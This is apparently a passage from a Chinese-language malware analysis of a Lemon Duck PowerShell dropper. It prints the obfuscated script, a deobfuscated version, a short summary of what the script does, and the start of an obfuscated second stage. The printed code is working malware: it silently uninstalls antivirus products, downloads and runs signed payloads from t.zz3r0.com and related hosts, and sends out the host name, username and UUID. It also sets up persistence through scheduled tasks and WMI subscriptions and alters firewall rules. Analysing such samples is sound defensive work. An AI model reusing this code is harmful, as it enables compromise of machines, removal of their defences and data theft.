wFcsOu%tsaUft+Uftva%sOu ekil&#x27;+&#x27; emanwFc erehw tcudorp exe.cimw b/ trats c/ dmc</span><br><span class="line"></span><br><span class="line">evitcaretnion/ llatsninu llac wF&#x27;+&#x27;csOu%%yks&#x27;+&#x27;re&#x27;+&#x27;psa&#x27;+&#x27;K%%sOuUft+Uft ekil&#x27;+&#x27; emanwFc er&#x27;+&#x27;ehw tcudorp exe.cimw b/ trats c/&#x27;+&#x27; &#x27;+&#x27;dmc</span><br><span class="line">&#x27;+&#x27;</span><br><span class="line">evitcare&#x27;+&#x27;tnio&#x27;+&#x27;n/ llatsninu Uft+Uftllac wFcsOu%tesE%sOu ekil emanwFc erehw tcudorp eUft+Uftxe.cimw b/ trats c/ d&#x27;+&#x27;mcUft(( ( )UftUftnIoJ-U&#x27;+&#x27;ftxUft+]3,1[)(GNiRtsOT.EcNeREFERpesobrEVNCh (.&#x27;((&quot; ; </span><br><span class="line">((  GET-VaRIaBlE 2Hl  -vAlUEOn)[- 1..- ((  GET-VaRIaBlE 2Hl  -vAlUEOn).LENGTh ) ]-JoIN&#x27;&#x27; ) </span><br></pre></td></tr></table></figure><p>对字符串翻转、美化后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> ; &quot;((&#x27;.( hCNVErbosepREFEReNcE.TOstRiNG()[1,3]+tfUxtf&#x27;+&#x27;U-JoIntfUtfU) ( ((tfUcm&#x27;+&#x27;d /c start /b wmic.extfU+tfUe product where cFwname like uOs%Eset%uOscFw calltfU+tfU uninstall /n&#x27;+&#x27;oint&#x27;+&#x27;eractive</span><br><span class="line">&#x27;+&#x27;</span><br><span class="line">cmd&#x27;+&#x27; &#x27;+&#x27;/c start /b wmic.exe product whe&#x27;+&#x27;re cFwname &#x27;+&#x27;like tfU+tfUuOs%%K&#x27;+&#x27;asp&#x27;+&#x27;er&#x27;+&#x27;sky%%uOsc&#x27;+&#x27;Fw call uninstall /nointeractive</span><br><span class="line">cmd /c start /b wmic.exe product where cFwname &#x27;+&#x27;like uOs%avtfU+tfUast%uOscFw call uninstall /nointeractive</span><br><span class="line">cmd /c start /b wmic.exe tfU+tfUproduct w&#x27;+&#x27;here tfU+tf&#x27;+&#x27;UcFwname like uOs%avp%uOsc&#x27;+&#x27;Fw catfU+tfUll uninstal&#x27;+&#x27;ltfU+tfU /nointeractive</span><br><span class="line">cmd /c start /b wmic.exe product&#x27;+&#x27; where cFwname like uOs%Security%uOscFw call &#x27;+&#x27;uni&#x27;+&#x27;nstall /nointeractive</span><br><span class="line">cmd /c start /b wmic.exe produc&#x27;+&#x27;t where cFwname like uOs%AntiVirus%uOscFw call uni&#x27;+&#x27;n&#x27;+&#x27;stall /&#x27;+&#x27;nointeractive</span><br><span class="line">cmd /c start /b wmic.exe product where cFwnametfU+tfU like uOs%Norton Security%uOscFw call uninstall /noi&#x27;+&#x27;nteractive</span><br><span class="line">cmd /c cFwC:9&#x27;+&#x27;RTProgra~19RTMalwarebytes9RTAnti-Malware9RTunins000.extfU+&#x27;+&#x27;tfUecFw /verysilent&#x27;+&#x27; /suppressmsgboxes /notfU+tfU&#x27;+&#x27;restart</span><br><span class="line">CdJv=cFw?&#x27;+&#x27;CdJvcFw+(Get-Date &#x27;+&#x27;-Format uOs_yyyyMMdduOs)</span><br><span class="line">CdJtmps=uOsfunction a(CdJu)&#123;CdJd=(Nefvpw&#x27;+&#x27;-Objfvp&#x27;+&#x27;ect Net.WebCfvplient).cFwDownloadDatacFw(CdJu)&#x27;+&#x27;;Cd&#x27;+&#x27;Jc=CdJd.count;if(C&#x27;+&#x27;dJc -gt 173)&#123;Cd&#x27;+&#x27;Jb=CdJd[173..CdJc];CdJp=NtfU+tfUew-Object Security.Cryptography.tfU+tfURSAParameters;CdtfU+tfUJtfU+&#x27;+&#x27;tfUp.Modulus=&#x27;+&#x27;[cotfU+tfUnvert]::FrotfU+tfUmBase64String(u&#x27;+&#x27;OsuOs2mWo17uX&#x27;+&#x27;vG1B&#x27;+&#x27;Xpm&#x27;+&#x27;dgv8v/3NTmnNubHtV6&#x27;+&#x27;2fWrk4jPtfU&#x27;+&#x27;+tfUF&#x27;+&#x27;I9wM3NN2tfU+tfUvzTzticIYHlm7K3r&#x27;+&#x27;2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv&#x27;+&#x27;1j1feIY6R7rpfqOLdHa10=uOstfU+tfUuOs);CdJp.ExpotfU+tfUnent=0x01,0x00tfU+&#x27;+&#x27;tfU,0x01;CdJr=New-Object Secu&#x27;+&#x27;rity.Cryptography.RSACryptoServiceProtfU+tfUvider;CdJr.Im&#x27;+&#x27;portParameters(Cd&#x27;+&#x27;JptfU+tfU);if(CdJtfU+tfUr.veri&#x27;+&#x27;fyData&#x27;+&#x27;(CdJb,(New-O&#x27;+&#x27;bject Security.Cryptography.SHA1&#x27;+&#x27;CryptoSetfU+tfUrtfU+tfUviceProvider)tfU+tfU,&#x27;+&#x27;[convert]::FromBase64String(-jtfU+tfUoin([char[]]Cd&#x27;+&#x27;Jd[0..171tfU+tfU]))))tfU+tfU&#123;Ifvpex(-join&#x27;+&#x27;[char[]]CdJb)&#125;&#125;&#125;CdJurl=utfU+tfUOsuOshttp://uOsuOstfU+tfU+uOsuOsU1uOsuOs+uOsuOsU2uOsuOs;a(CdJurl+uOsuOs/a.jspuOs+CdJvtfU+tfU+uOs?uOsuOs+(@(CdJenv:COMPtfU+tfU&#x27;+&#x27;UTERNAME,CdJenv:USERNAME,(get-wmiobject Win32tfU+tfU_ComputerSystemProd&#x27;+&#x27;uct).UUID,(random))-joinuOsuOs*&#x27;+&#x27;uOsuOs))uOs</span><br><span class="line">CdJsa=([SecuritfU+tfUty&#x27;+&#x27;.Principal.WindowsPrincipal][Security.Principal.W&#x27;+&#x27;indowsIdentity]::GetCurrent()).IsInRole([Se&#x27;+&#x27;ctfU+tfUurity.Princitf&#x27;+&#x27;U+tfUpaltfU+tfU.WtfU+t&#x27;+&#x27;fU&#x27;+&#x27;indowsBuiltfU+tfUtInRole] cFw&#x27;+&#x27;A&#x27;+&#x27;dministratorcFw)</span><br><span class="line">funct&#x27;+&#x27;ion getRan(tfU+tfU)&#123;return -join([char[]](48..57+65tfU+tfU..90+97..122)T&#x27;+&#x27;jQGet-Random -Count (6+(Get-Random&#x27;+&#x27;)%6))&#125;</span><br><span class="line">CdJus=@(uOst.zz3r0.tfU+tfUcotfU+tfUmuOs,uOst.zer9g.comuOs,uOst.amynx.c&#x27;+&#x27;omuOs)</span><br><span class="line">tfU+tfU</span><br><span class="line">CdJstsrv = New-Object -ComObject Schedule.Service</span><br><span class="line">tfU+tf&#x27;+&#x27;U</span><br><span class="line">CdJ&#x27;+&#x27;stsrv.Connect()</span><br><span class="line">try&#123;</span><br><span class="line">CdJdo&#x27;+&#x27;it=CdJstsrv.Ge&#x27;+&#x27;tFolder(cFw9RTcFw).GetTask(ctfU&#x27;+&#x27;+tfUFwblackballctfU&#x27;+&#x27;+tfU&#x27;+&#x27;Fw&#x27;+&#x27;)</span><br><span class="line">&#125;catch&#123;&#125;</span><br><span class="line">if(-not CdJdoit)&#123;</span><br><span class="line">if(CdJsa)&#123;</span><br><span class="line">schtasks&#x27;+&#x27; /c&#x27;+&#x27;reate /ru system /sc MINUTE /mo 120tfU+tfU /tn blackball /F /tr c&#x27;+&#x27;Fwb&#x27;+&#x27;lackballcFw</span><br><span class="line">&#125; else &#123;</span><br><span class="line">schtasks /create /tfU+tfUsc MINUTE /tfU+tfUmo 120 /tn &#x27;+&#x27;blackball /F /tr cF&#x27;+&#x27;wblackballcFw</span><br><span class="line">&#125;</span><br><span class="line">foreach(CdJu in CdJus)&#123;</span><br><span class="line">CdJi = [array]::IndexOf(CtfU+tfUdJus,CdJu)</span><br><span class="line">if(CdJi%3 -eq 0)&#123;CdJtn&#x27;+&#x27;f=uOsu&#x27;+&#x27;tfU+tfUOs&#125;</span><br><span class="line">if(CdJt&#x27;+&#x27;fU+tfUi%3 -eq 1)&#123;CdJtnf=getRan&#125;</span><br><span class="line">if&#x27;+&#x27;(CdJi%3tfU+tfU -eq 2)&#123;if(CdJsa)&#123;CdJtnf=uOsMictfU&#x27;+&#x27;+tfUroSoft9R&#x27;+&#x27;TWindows9RTuOs+(getRan)&#125;else&#123;CdJtnf=gettf&#x27;+&#x27;U&#x27;+&#x27;+t&#x27;+&#x27;fURan&#125;&#125;</span><br><span class="line">CdJtn = getRan</span><br><span class="line">if(CdJsa)&#123;</span><br><span class="line">schtatfU&#x27;+&#x27;+tfUsks /create /ru system /sc MINUTE /mo 60 /tn cFwCdJtnf9RTCdJtncFw /F /tr cFwpowershell -w hidden -c PS_CMDcFw</span><br><span class="line">&#125; else &#123;</span><br><span class="line">schtasks /creat&#x27;+&#x27;et&#x27;+&#x27;fU+tfU /sc &#x27;+&#x27;MINUTE /mo 60 /tn cFwCdJtnf9RTCdJtncFw /F /tr cFwpowershell -w hidden -c PS_CMDcFw</span><br><span class="line">&#125;</span><br><span class="line">&#x27;+&#x27;</span><br><span class="line">&#x27;+&#x27;start-sleep 1</span><br><span class="line">CdJfolder=CdJstsrv.GetFolder(cFw9RTCdtfU+tfUJtnfcFw)</span><br><span class="line">CdJtaskitem=CdJfolder.GetTasks(1tfU+tfU)</span><br><span class="line">foreatfU+tfUch(CdJtfU+tfUtask in CdJtaskitem&#x27;+&#x27;)&#123;</span><br><span class="line">foreach (CdJatfU+tfUction in CdJtask.DefitfU+tfUnition.Ac&#x27;+&#x27;tions) &#123;</span><br><span class="line">try&#123;</span><br><span class="line">if(CdJaction.ArgumtfU+tfUents.C&#x27;+&#x27;ontains&#x27;+&#x27;(cFwPS&#x27;+&#x27;_CMDcFw))&#123;</span><br><span class="line">C&#x27;+&#x27;dJfolder.RegisterTask(CdJtask.Name, CdJtask.Xml.replace(cFwPS_CMDcFw,CdJtmps.replace(u&#x27;+&#x27;OsU1uOs,CdJu.substring(0,5t&#x27;+&#x27;fU+tfU)).replace(uOsU2uOs,CdJu.substring&#x27;+&#x27;(5))), 4, &#x27;+&#x27;CdJnull, CdJnull, 0, CdtfU&#x27;+&#x27;+tfUJnull)TjQout-null</span><br><span class="line">&#x27;+&#x27;&#125;</span><br><span class="line">&#125;catch&#123;&#125;</span><br><span class="line">&#125;tfU+tfU</span><br><span class="line">&#125;</span><br><span class="line">start-tf&#x27;+&#x27;U+tfUsleep 1</span><br><span class="line">schtasks /run /tn cFwCdJtnf9RTCdJtncFw&#x27;+&#x27;</span><br><span class="line">stfU+tfUt&#x27;+&#x27;art-sleetf&#x27;+&#x27;U+&#x27;+&#x27;tfUp 5</span><br><span class="line">&#125;&#x27;+&#x27;</span><br><span class="line">&#125;</span><br><span class="line">try&#123;</span><br><span class="line">CdJdoit1=Get-WMIObject -Class __EventFilter -tfU+tfUNameSpace uOsroot9RTsubscriptiotfU+tfUnuOs -filter cFwName=tfU+tf&#x27;+&#x27;UuOsblackballuOscFw</span><br><span class="line">&#125;catch&#123;&#125;&#x27;+&#x27;</span><br><span class="line">if(-not &#x27;+&#x27;CdJdoit1)&#123;</span><br><span class="line">    Set-WmiInstance -Class __EventFilter -NameSpace ctfU+tfUFwroot9R&#x27;+&#x27;TsubscrtfU+tfUiptioncFw -ArgumtfU+tfUents @&#123;Name=&#x27;+&#x27;cFwblackballcFw;EventNameSpace=cFwroot9RTctfU+tfUimv2cFw;QueryLangua&#x27;+&#x27;ge=cFwWQLcFw;Query=cF&#x27;+&#x27;wSELECT * FROM __InstanceModi&#x27;+&#x27;ficationEvent WITHIN &#x27;+&#x27;3600 WHERE TargetInstance ISA uOsWin32_PerfFormattedData_PerfOS_StfU+tfUystemuOscFw;&#125; -ErrorAction Stop</span><br><span class="line">    tfU+tfUforeach(CdJu in CdJus)&#123;tf&#x27;+&#x27;U+tf&#x27;+&#x27;U</span><br><span class="line">    &#x27;+&#x27;    CdJtheName=get&#x27;+&#x27;Ran</span><br><span class="line">&#x27;+&#x27;        CdJwmicmd=CdJtmps.replace(uOsU1uOs,CdJu.subs&#x27;+&#x27;tring(&#x27;+&#x27;0,5)).replace(uOsU2uOstfU+tfU,CdJu.&#x27;+&#x27;substring(5)).replace(uOsa.jspuOs,uOsaa.jspuOs)</span><br><span class="line">  &#x27;+&#x27;      Set-WmiInstance -Class __FilterToConsumerBinding -Namespace&#x27;+&#x27; cFwrtfU+tfUoot9t&#x27;+&#x27;fU+tfU&#x27;+&#x27;RTsubscriptioncFwtfU+tfU -Arguments @&#123;Filter=(Set-WmiInstance -Class __Eve&#x27;+&#x27;ntFilter -NameSpace cFwroot9RTsubscri&#x27;+&#x27;ptioncFw&#x27;+&#x27; -Argument&#x27;+&#x27;s @&#123;Name=cFwfcFw+CdJtheName;EventNameSpace=c&#x27;+&#x27;Fwroot9tfU+tfURTcimv2cFw;QueryLanguage=cFwWQLcFw;Query=c&#x27;+&#x27;FwSELECT * FROM __InstanceModificatfU+tfUtiotfU+t&#x27;+&#x27;fUnEvent WITHIN 3600 WHERE tfU+&#x27;+&#x27;tfUTargetIn&#x27;+&#x27;stantfU+tfUce ISA uOsWin32_PerfFormat&#x27;+&#x27;tedDatatfU+tfU_PertfU+tfUfOS_SystemuOscFw;&#125; -ErrorAt&#x27;+&#x27;fU+tfUctio&#x27;+&#x27;n Stop);Consu&#x27;+&#x27;mer=(Set-WmiInstance -Class CotfU+tfU&#x27;+&#x27;mmandLineEventConsume&#x27;+&#x27;r &#x27;+&#x27;-NamespactfU+tfUe cFwrotfU+tfUot9RTsubscriptioncFw -Arguments @&#123;Name=cFwcc&#x27;+&#x27;Fw+CdJtheN&#x27;+&#x27;am&#x27;+&#x27;e;ExecutablePath=cFwc:9RTwindows9RTsystem329RTcmd.execFw;CommandLineTe&#x27;+&#x27;mplate=cFw/c power&#x27;+&#x27;shell -w hidden -c &#x27;+&#x27;CdJw&#x27;+&#x27;micmdcFtfU+&#x27;+&#x27;tfU&#x27;+&#x27;w&#125;)&#125;</span><br><span class="line">        start&#x27;+&#x27;-sleep 5</span><br><span class="line">&#x27;+&#x27;  &#x27;+&#x27;  &#x27;+&#x27;&#125;</span><br><span class="line">tfU+tfU</span><br><span class="line">    cmd&#x27;+&#x27;.exe /c netsh.exe firewall add portopening tcp&#x27;+&#x27; 65529 SDNSd</span><br><span class="line">    netsh.exe intertfU+tfUface tfU+tfUptfU+tfUortproxy add v4tov4 listenport=65529 ctfU+tfUonnectaddress=1.1.1.1 connectport=53</span><br><span class="line">    netsh advfirewtfU+tfUall firewall ad&#x27;+&#x27;d rule name=ctfU+tfUFwde&#x27;+&#x27;ny4&#x27;+&#x27;45cFw dir=in protocol=&#x27;+&#x27;tcp tfU+tfUlocalport=445 action=block</span><br><span class="line">    netsh advfirewall firewall add rule tfU+tf&#x27;+&#x27;Uname=cFwdeny135c&#x27;+&#x27;tfU+tfUF&#x27;+&#x27;w dir=in protocol=&#x27;+&#x27;t&#x27;+&#x27;cp lo&#x27;+&#x27;calport=135 ac&#x27;+&#x27;tion=block</span><br><span class="line">    Set-ItemProperty -Path cFwHKLM:9RTSYSTEM9RTCurrentControlSet9RTServices9RTLanmanServer9RTParame&#x27;+&#x27;ter&#x27;+&#x27;scFw DisableCompression -Type tfU+&#x27;+&#x27;tfUDWORD -Valu&#x27;+&#x27;e 1 ???Force</span><br><span class="line">&#125;</span><br><span class="line">schtasks /delete /tfU+tfUtn Rtsa2 /F</span><br><span class="line">&#x27;+&#x27;</span><br><span class="line">schtasks /deletfU+tfUte /tn Rtsa1 /F</span><br><span class="line">schtasks /delete /tn Rtsa /FtfU)-cREplaCe  ([CHaR]1&#x27;+&#x27;02+[CHaR]118+[CHaR]11&#x27;+&#x27;2),[CHaR]96  -RepLaCE tfU9RTtfU,[CH&#x27;+&#x27;aR]92 &#x27;+&#x27;-cREplaCetfUCdJtfU,[CHaR]36-RepLaCEtfUTjQtfU,[CHa&#x27;+&#x27;R]124 -cREplaCe&#x27;+&#x27; ([CHaR]117+[CHaR]7&#x27;+&#x27;9+[CHaR]115),[CHa&#x27;+&#x27;R]39-R&#x27;+&#x27;epLaCE([CHa&#x27;+&#x27;R]99+[C&#x27;+&#x27;HaR]70+[CHaR]119),[CHaR]34) )&#x27;+&#x27;</span><br><span class="line">&#x27;) -ReplaCE  &#x27;tfU&#x27;,[CHaR]39  -ReplaCE  &#x27;hCN&#x27;,[CHaR]36)| &amp;( $pShOMe[21]+$PSHOme[34]+&#x27;x&#x27;)&quot; =  lh2$</span><br></pre></td></tr></table></figure><p>继续处理混淆后如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd /c start /b wmic.exe product where &quot;name like &#x27;%Eset%&#x27;&quot; call uninstall /nointeractive</span><br><span class="line">cmd /c start /b wmic.exe product where &quot;name like &#x27;%%Kaspersky%%&#x27;&quot; call uninstall /nointeractive</span><br><span class="line">cmd /c start /b wmic.exe product where &quot;name like &#x27;%avast%&#x27;&quot; call uninstall /nointeractive</span><br><span class="line">cmd /c start /b wmic.exe product where &quot;name like &#x27;%avp%&#x27;&quot; call uninstall /nointeractive</span><br><span class="line">cmd /c start /b wmic.exe product where &quot;name like &#x27;%Security%&#x27;&quot; call uninstall /nointeractive</span><br><span class="line">cmd /c start /b wmic.exe product where &quot;name like &#x27;%AntiVirus%&#x27;&quot; call uninstall /nointeractive</span><br><span class="line">cmd /c start /b wmic.exe product where &quot;name like &#x27;%Norton Security%&#x27;&quot; call uninstall /nointeractive</span><br><span class="line">cmd /c &quot;C:\Progra~1\Malwarebytes\Anti-Malware\unins000.exe&quot; /verysilent /suppressmsgboxes /norestart</span><br><span class="line">$v=&quot;?$v&quot;+(Get-Date -Format &#x27;_yyyyMMdd&#x27;)</span><br><span class="line">$tmps=&#x27;function a($u)&#123;$d=(New-Object Net.WebClient).&quot;DownloadData&quot;($u);</span><br><span class="line">$c=$d.count;</span><br><span class="line">if($c -gt 173)&#123;$b=$d[173..$c];</span><br><span class="line">$p=New-Object Security.Cryptography.RSAParameters;</span><br><span class="line">$p.Modulus=[convert]::FromBase64String(&#x27;&#x27;2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=&#x27;&#x27;);</span><br><span class="line">$p.Exponent=0x01,0x00,0x01;</span><br><span class="line">$r=New-Object Security.Cryptography.RSACryptoServiceProvider;</span><br><span class="line">$r.ImportParameters($p);</span><br><span class="line">if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171]))))&#123;Iex(-join[char[]]$b)&#125;&#125;&#125;$url=uOs&#x27;http://&#x27;&#x27;+&#x27;&#x27;U1&#x27;&#x27;U2&#x27;&#x27;;</span><br><span class="line">a($url+&#x27;&#x27;/a.jsp&#x27;+$v+&#x27;?&#x27;&#x27;+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join&#x27;&#x27;*&#x27;&#x27;))&#x27;</span><br><span class="line">$sa=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &quot;Administrator&quot;)</span><br><span class="line">function getRan()&#123;return -join([char[]](48..57+65..90+97..122)|Get-Random -Count (6+(Get-Random)%6))&#125;</span><br><span class="line">$us=@(&#x27;t.zz3r0.com&#x27;,&#x27;t.zer9g.com&#x27;,&#x27;t.amynx.com&#x27;)</span><br><span class="line">$stsrv = New-Object -ComObject Schedule.Service</span><br><span class="line">$stsrv.Connect()</span><br><span class="line">try&#123;</span><br><span class="line">$doit=$stsrv.GetFolder(&quot;\&quot;).GetTask(&quot;blackball&quot;)</span><br><span class="line">&#125;catch&#123;&#125;</span><br><span class="line">if(-not $doit)&#123;</span><br><span class="line">if($sa)&#123;</span><br><span class="line">schtasks /create /ru system /sc MINUTE /mo 120 /tn blackball /F /tr &quot;blackball&quot;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">schtasks /create /sc MINUTE /mo 120 /tn blackball /F /tr &quot;blackball&quot;</span><br><span class="line">&#125;</span><br><span class="line">foreach($u in $us)&#123;</span><br><span class="line">$i = [array]::IndexOf(CdJus,$u)</span><br><span class="line">if($i%3 -eq 0)&#123;$tnf=&#x27;uOs&#125;</span><br><span class="line">if($i%3 -eq 1)&#123;$tnf=getRan&#125;</span><br><span class="line">if($i%3 -eq 2)&#123;if($sa)&#123;$tnf=&#x27;MicroSoft\Windows\&#x27;+(getRan)&#125;else&#123;$tnf=getRan&#125;&#125;</span><br><span class="line">$tn = getRan</span><br><span class="line">if($sa)&#123;</span><br><span class="line">schtasks /create /ru system /sc MINUTE /mo 60 /tn &quot;$tnf\$tn&quot; /F /tr &quot;powershell -w hidden -c PS_CMD&quot;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">schtasks /create /sc MINUTE /mo 60 /tn &quot;$tnf\$tn&quot; /F /tr &quot;powershell -w hidden -c PS_CMD&quot;</span><br><span class="line">&#125;</span><br><span class="line">start-sleep 1</span><br><span class="line">$folder=$stsrv.GetFolder(&quot;\$tnf&quot;)</span><br><span class="line">$taskitem=$folder.GetTasks(1)</span><br><span class="line">foreach($task in $taskitem)&#123;</span><br><span class="line">foreach ($action in $task.Definition.Actions) &#123;</span><br><span class="line">try&#123;</span><br><span class="line">if($action.Arguments.Contains(&quot;PS_CMD&quot;))&#123;</span><br><span class="line">$folder.RegisterTask($task.Name, $task.Xml.replace(&quot;PS_CMD&quot;,$tmps.replace(&#x27;U1&#x27;,$u.substring(0,5)).replace(&#x27;U2&#x27;,$u.substring(5))), 4, $null, $null, 0, CdJnull)|out-null</span><br><span class="line">&#125;</span><br><span class="line">&#125;catch&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">start-sleep 1</span><br><span class="line">schtasks /run /tn &quot;$tnf\$tn&quot;</span><br><span class="line">start-sleep 5</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">try&#123;</span><br><span class="line">$doit1=Get-WMIObject -Class __EventFilter -NameSpace &#x27;root\subscription&#x27; -filter &quot;Name=&#x27;blackball&#x27;&quot;</span><br><span class="line">&#125;catch&#123;&#125;</span><br><span class="line">if(-not $doit1)&#123;</span><br><span class="line">    Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=&quot;blackball&quot;;</span><br><span class="line">    EventNameSpace=&quot;root\cimv2&quot;;</span><br><span class="line">    QueryLanguage=&quot;WQL&quot;;</span><br><span class="line">    Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;;</span><br><span class="line">    &#125; -ErrorAction Stop</span><br><span class="line">    foreach($u in $us)&#123;</span><br><span class="line">        $theName=getRan</span><br><span class="line">   $wmicmd=$tmps.replace(&#x27;U1&#x27;,$u.substring(0,5)).replace(&#x27;U2&#x27;,$u.substring(5)).replace(&#x27;a.jsp&#x27;,&#x27;aa.jsp&#x27;)</span><br><span class="line">        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace &quot;root\subscription&quot; -Arguments @&#123;Filter=(Set-WmiInstance -Class __EventFilter -NameSpace &quot;root\subscription&quot; -Arguments @&#123;Name=&quot;f&quot;+$theName;</span><br><span class="line">        EventNameSpace=&quot;root\cimv2&quot;;</span><br><span class="line">        QueryLanguage=&quot;WQL&quot;;</span><br><span class="line">        Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA &#x27;Win32_PerfFormattedData_PerfOS_System&#x27;&quot;;</span><br><span class="line">        &#125; -ErrorAction Stop);</span><br><span class="line">        Consumer=(Set-WmiInstance -Class CommandLineEventConsumer -Namespace &quot;root\subscription&quot; -Arguments @&#123;Name=&quot;c&quot;+$theName;</span><br><span class="line">        ExecutablePath=&quot;c:\windows\system32\cmd.exe&quot;;</span><br><span class="line">        CommandLineTemplate=&quot;/c powershell -w hidden -c $wmicmd&quot;&#125;)&#125;</span><br><span class="line">        start-sleep 5</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cmd.exe /c netsh.exe firewall add portopening tcp 65529 SDNSd</span><br><span class="line">    netsh.exe interface portproxy add v4tov4 listenport=65529 connectaddress=1.1.1.1 connectport=53</span><br><span class="line">    netsh advfirewall firewall add rule name=&quot;deny445&quot; dir=in protocol=tcp localport=445 action=block</span><br><span class="line">    netsh advfirewall firewall add rule name=&quot;deny135&quot; dir=in protocol=tcp localport=135 action=block</span><br><span class="line">    Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters&quot; DisableCompression -Type DWORD -Value 1 ???Force</span><br><span class="line">&#125;</span><br><span class="line">schtasks /delete /tn Rtsa2 /F</span><br><span class="line">schtasks /delete /tn Rtsa1 /F</span><br><span class="line">schtasks /delete /tn Rtsa /F</span><br></pre></td></tr></table></figure><h4 id="脚本主要功能"><a href="#脚本主要功能" class="headerlink" title="脚本主要功能"></a>脚本主要功能</h4><ul><li>尝试卸载杀软（eset、卡巴斯基、avast、诺顿等）</li><li>依次尝试从<code>t.zz3r0.com</code>、<code>t.zer9g.com</code>、<code>t.amynx.com</code>下载<code>a.jsp</code>后重命名为<code>aa.jsp</code></li><li>检测权限是否为<code>administrator</code>，如果是则创建计划任务<code>blackball</code></li><li>设置SMB为启用</li><li>防火墙添加转发、阻断规则</li><li>下载时判断返回长度是否大于等于173，如果大于则解密前173个字符并用来做SHA1校验，如校验成功则执行下一阶段脚本</li></ul><h2 id="a-jsp-第二阶段攻击脚本"><a href="#a-jsp-第二阶段攻击脚本" class="headerlink" title="a.jsp 第二阶段攻击脚本"></a>a.jsp 第二阶段攻击脚本</h2><p>a.jsp为第二阶段攻击脚本</p><p>脚本在下载攻击文件时会携带UA<code>Lemon-Duck-</code></p><p><img src="/images/image-20210104144443363.png" alt="image-20210104144443363"></p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">oM/axl7kOfLq0gbJx+jFEsor6+Z66LcorosvJGnVxNCU34epX0b7EbBhZPTvwFOaF7grX+nwaPyA/<span class="number">6</span>VCNiCkpsWL1J3yWm68X8f8KGhc+gPwGvgjJk8Y+twUiQGYsIT6Y7w9xpVVZspbOsF+tIWXiXtf+<span class="number">0</span>pEdrsCOVnqU83dTtE=</span><br><span class="line">I`EX <span class="variable">$</span>(<span class="built_in">New-Object</span> IO.StreamReader (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.Compression.DeflateStream (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.MemoryStream (,<span class="variable">$</span>(<span class="string">&#x27;&#x27;</span><span class="operator">-split</span><span class="string">&#x27;(..)&#x27;</span>|?&#123;<span class="variable">$_</span>&#125;|%&#123;[<span class="type">convert</span>]::ToUInt32(<span class="variable">$_</span>,<span class="number">16</span>)&#125;))), [<span class="type">IO.Compression.CompressionMode</span>]::Decompress)), [<span class="type">Text.Encoding</span>]::ASCII)).ReadToEnd();</span><br></pre></td></tr></table></figure><p>解密得到如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sET-VarIaBlE  (&#x27;Q2G&#x27;+&#x27;4h&#x27;)  ( &quot;)&#x27;&#x27;Nioj-&#x27;X&#x27;+]3,1[)ecNerEFerPESOBreV$]gNIRTS[( ( &amp;| )63]rAHc[]gNiRTs[,)65]rAHc[+58]rAHc[+05]rAHc[((EcaLper.)93]rAHc[]gNiRTs[,)311]rAHc[+97]rAHc[+211]rAHc[((EcaLper.)&#x27;|&#x27;,)021]rAHc[+121]rAHc[+311]rAHc[((EcaLper.)&#x27;</span><br><span class="line"></span><br><span class="line">)qOpXqOp+]&#x27;+&#x27;31[DIlLEhs8U2+]1[dIlLEhS8&#x27;+&#x27;U2 ( .xy&#x27;+&#x27;q)69]rAHc[,qOpQUrqOp EcALP&#x27;+&#x27;e&#x27;+&#x27;rc-43]rAHc[,qOp7kMqOpEcALPerc-29]rAHc[,qOpd3yqOp EcALPerc-  63]rAHc[,)68]rAHc[+45]rAHc[+76]rAHc[( ECALPer-  93]rAHc[,)45&#x27;+&#x27;]rAHc[+66]rAHc[+58]rAH&#x27;+&#x27;c[( ECALPer- 421]rAHc[,)18]rAHc[+501]rAHc[+001]&#x27;+&#x27;rAHc[( EcALPerc-)qOp&#125;</span><br><span class="line"></span><br><span class="line">7kMnib.edo/lru_nwodV6C7kM XEI&#x27;+&#x27;S</span><br><span class="line"></span><br><span class="line">&#123;))gol.kk4kkd3ypmt:qOp+qOpvneV6C htap-tset(!(fiqOp+qOp</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">7kMniqOp+qOpb.liamqOp+qOp_fi/lr&#x27;+&#x27;u_nwodV6C7kM XEIS</span><br><span class="line"></span><br><span class="line">&#123;))txt.4iq&#x27;+&#x27;Op+qOplamdogd3ypmt:vneV6C htap-tset(!(fi</span><br><span class="line"></span><br><span class="line">&#123;)liaMlacolV6C(fi</span><br><span class="line"></span><br><span class="line">&#125;&#123;hctac&#125;)liaMlacolV6C]fer[,6BUqOp+qOpliaMlacoLd3ylqO&#x27;+&#x27;p+qOpabolG6BU,eurtV&#x27;+&#x27;6C(xetuM.gnidaerhT 